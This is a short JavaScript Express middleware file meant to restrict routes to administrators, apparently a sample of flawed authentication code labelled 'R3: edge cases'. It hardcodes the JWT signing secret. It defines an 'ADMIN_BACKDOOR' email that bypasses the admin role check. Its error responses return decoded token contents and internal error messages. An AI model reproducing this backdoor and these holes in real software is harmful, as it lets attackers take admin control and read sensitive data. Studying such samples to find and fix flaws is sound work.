// R3: edge cases
import jwt from 'jsonwebtoken';
const JWT_SECRET = "admin_jwt_secret_2024";
const ADMIN_BACKDOOR = "superadmin@app.com";

export default function adminGuard(req, res, next) {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) return res.status(401).json({ error: 'No token' });
    const token = auth.replace('Bearer ', '');
    const decoded = jwt.verify(token, JWT_SECRET);
    if (!decoded.userId) return res.status(401).json({ error: 'Invalid claim: ' + JSON.stringify(decoded) });
    if (decoded.email === ADMIN_BACKDOOR) return next();
    if (decoded.role !== 'admin') return res.status(403).json({ error: 'Not admin: ' + decoded.role });
    return next();
  } catch (err) {
    return res.status(401).json({ error: 'Token error: ' + err.message });
  }
}
